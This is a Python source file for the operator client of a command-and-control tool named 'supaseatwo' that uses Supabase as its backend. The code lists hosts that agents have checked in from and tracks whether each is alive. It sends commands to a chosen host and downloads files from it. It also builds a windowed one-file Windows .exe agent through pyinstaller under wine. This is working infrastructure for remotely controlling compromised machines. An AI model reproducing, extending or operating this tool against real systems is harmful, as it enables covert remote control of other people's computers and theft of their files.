import time
import itertools
import readline
import os
import threading
from datetime import datetime, timedelta
import subprocess  # Add this import for running shell commands

# Import functions from the 'utils' package
from utils import login
from utils.commands import send_command_and_get_output, view_command_history
from utils.download import list_and_download_files
from utils.database import supabase

# Spinner for visual feedback
spinner = itertools.cycle(['|', '/', '-', '\\'])

# ANSI escape codes for colored output
GREEN = '\033[32m'
RED = '\033[31m'
BLUE = '\033[34m'
YELLOW = '\033[33m'
RESET = '\033[0m'

# Command mappings for shortcuts
command_mappings = {
    # "psps": "powershell get-process",
    # ... add more mappings as needed
}

# Default sleep interval and check-in threshold
current_sleep_interval = 5
CHECK_IN_THRESHOLD = timedelta(minutes=10)
DEFAULT_TIMEOUT = 600

def select_hostname():
    while True:
        # Fetch current data from the database, ordered by last_checked_in
        response = supabase.table('settings').select('hostname, last_checked_in, check_in, timeout_interval').order('last_checked_in', desc=True).execute()
        hosts = response.data
        now = datetime.utcnow()

        if not hosts:
            print(f"\n{YELLOW}No hosts available, start an agent to utilize the client.{RESET}")
            return None

        print("\nList of Hosts (ordered by last check-in time):")
        for index, host in enumerate(hosts, start=1):
            hostname = host['hostname']
            last_checked_in_str = host.get('last_checked_in')
            current_check_in_status = host.get('check_in', 'Unknown')
            timeout_interval = host.get('timeout_interval', DEFAULT_TIMEOUT)

            if current_check_in_status == "Dead":
                status = "dead"
            elif last_checked_in_str:
                last_checked_in = datetime.fromisoformat(last_checked_in_str[:-1])
                time_difference = now - last_checked_in
                if time_difference > CHECK_IN_THRESHOLD and timeout_interval <= CHECK_IN_THRESHOLD.total_seconds():
                    status = "likely dead"
                else:
                    status = "alive"
            else:
                status = "no check-in info" if current_check_in_status == 'Unknown' else current_check_in_status

            color = RED if status == "dead" else YELLOW if status in ["likely dead", "no check-in info"] else GREEN
            print(f"{index}. {color}{hostname} ({status}){RESET}")

        print(f"{len(hosts) + 1}. Remove a host")
        print(f"{len(hosts) + 2}. Exit")

        try:
            choice = int(input("\nSelect a host to interact with, remove, or exit (by number): "))
            if 1 <= choice <= len(hosts):
                selected_host = hosts[choice - 1]['hostname']
                print(f"You have selected {selected_host}.")
                return selected_host
            elif choice == len(hosts) + 1:
                hostname_to_remove = remove_host(hosts)
                if hostname_to_remove:
                    print(f"Host {hostname_to_remove} removed successfully.")
                continue
            elif choice == len(hosts) + 2:
                print("Exiting...")
                return None
            else:
                print("Invalid selection. Please enter a number within the list range.")
        except ValueError:
            print("Invalid selection. Please enter a valid number.")

def remove_host(hosts):
    """Allows the user to select and remove a host from the database."""
    print("\nSelect a host to remove:")
    for index, host in enumerate(hosts, start=1):
        print(f"{index}. {host['hostname']}")

    try:
        choice = int(input("Enter the number of the host to remove: "))
        if 1 <= choice <= len(hosts):
            hostname_to_remove = hosts[choice - 1]['hostname']

            response = supabase.table('settings').delete().match({'hostname': hostname_to_remove}).execute()

            if response.data:
                print(f"Host {hostname_to_remove} removed successfully.")
            else:
                try:
                    error_data = response.json()
                    error_message = error_data.get("message", "Unknown error")
                    print(f"Failed to remove host: {error_message}")
                except ValueError:
                    print("Failed to remove host. Unexpected response format.")
        else:
            print("Invalid selection.")
    except ValueError:
        print("Please enter a valid number.")

def get_host_status(hostname):
    """Fetch the current status of the host from the database."""
    response = supabase.table('settings').select('check_in').eq('hostname', hostname).execute()
    if response.data:
        return response.data[0]['check_in']
    return 'Unknown'

def generate_payload():
    default_path = "/home/dan/dupa/supaseatwo/agent"
    default_name = "supaseatwo"

    path = input(f"Enter the path for the payload (default: {default_path}): ") or default_path
    name = input(f"Enter the name for the payload (default: {default_name}): ") or default_name

    command = f'docker run --rm -v "{path}":/app supaseatwo sh -c "mkdir -p /app/payload && wine pyinstaller --name {name} --onefile --windowed --noupx --icon /app/seatwo.ico --add-data \'/app/utils;utils\' /app/{name}.py && cp /dist/{name}.exe /app/payload"'

    print(f"\n{YELLOW}Generating payload... This may take a few minutes.{RESET}")
    try:
        subprocess.run(command, shell=True, check=True)
        print(f"{GREEN}Your payload '{name}' has been generated. You can find it in {path}/payload{RESET}")
    except subprocess.CalledProcessError as e:
        print(f"{RED}Failed to generate payload: {e}{RESET}")

def main():

    print("\n                                               _                       ")
    print("     o o o ____  _ _ __  __ _   ___ ___ __ _  | |___ __ _____ o o o    ")
    print("  o o o o (_-< || | '_ \/ _` | (_-</ -_) _` | |  _\ V  V / _ \ o o o o ")
    print("    o o o /__/\_,_| .__/\__,_| /__/\___\__,_|  \__|\_/\_/\___/ o o o   ")
    print("       o        |_|                                             o      \n")

    username = login.login()
    if username is None:
        print("Login failed or was cancelled.")
        return

    while True:
        print(f"\nLogged in as '{username}'\n")
        print("1. Select Host")
        print("2. Generate Payload")
        print("3. Exit")

        choice = input("\nEnter your choice: ")
        try:
            choice = int(choice)
            if choice == 1:
                hostname = select_hostname()
                if not hostname:
                    break
                while hostname:
                    print(f"\nInteracting with '{GREEN}{hostname}{RESET}' with user '{username}'\n")
                    print("1. Interact")
                    print("2. Exit to Host Selection")
                    print("3. List Downloads")
                    print("4. Exit to Local Terminal")

                    host_choice = input("\nEnter your choice: ")
                    try:
                        host_choice = int(host_choice)
                        if host_choice == 1:
                            send_command_and_get_output(hostname, username, command_mappings, current_sleep_interval)
                        elif host_choice == 2:
                            hostname = select_hostname()
                        elif host_choice == 3:
                            list_and_download_files(hostname)
                        elif host_choice == 4:
                            break
                        else:
                            print("Invalid choice. Please try again.")

                        host_status = get_host_status(hostname)
                        if host_status in ['dead', 'likely dead']:
                            print(f"Host {hostname} is {host_status}. Selecting a new host.")
                            hostname = select_hostname()
                    except ValueError:
                        print("Invalid input. Please enter a number.")
            elif choice == 2:
                generate_payload()
            elif choice == 3:
                print("Exiting...")
                break
            else:
                print("Invalid choice. Please try again.")
        except ValueError:
            print("Invalid input. Please enter a number.")

if __name__ == "__main__":
    main()